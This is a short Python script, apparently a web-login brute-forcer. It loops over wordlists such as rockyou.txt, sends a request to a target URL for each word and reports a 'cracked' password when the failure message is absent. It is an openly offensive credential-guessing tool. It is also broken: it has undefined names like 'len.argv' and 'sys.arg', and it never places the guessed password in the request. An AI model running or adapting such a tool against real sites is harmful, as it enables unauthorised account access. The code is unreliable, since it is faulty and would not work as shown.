import requests
import sys
import threading

file_list = ["rockyou.txt","password.txt"]
def mother(url,identifier):
    for file in file_list:
        data = ""
        def Cracker(url,identifier):
            f = open(file,"r")
            lines = f.readlines()
            for line in lines: 
                r = requests.get(url,data=data)
                res_text = r.text
                if identifier not in res_text:
                    print("PASSWORD IS CRACKED SUCCESFULLY!")
                    sys.stdout.write(f"(+) password => {line}")
                else:
                    sys.stdout.write("\r"+line)
        Cracker(url,identifier)
def main():
    if(len.argv) != 3:
        print("(+) Usage: %s <url> <identifier>" % sys.argv[0])
        print("(+) Example: %s www.example.com Invalid password"% sys.argv[0])

    url = sys.arg[1]
    identifier = sys.arg[2]
    print("(+) Retrieving password.....")
    t1 = threading.Thread(target=mother,args=(url,identifier))
    t1.start()

if __name__ == "__main__":
    main()
    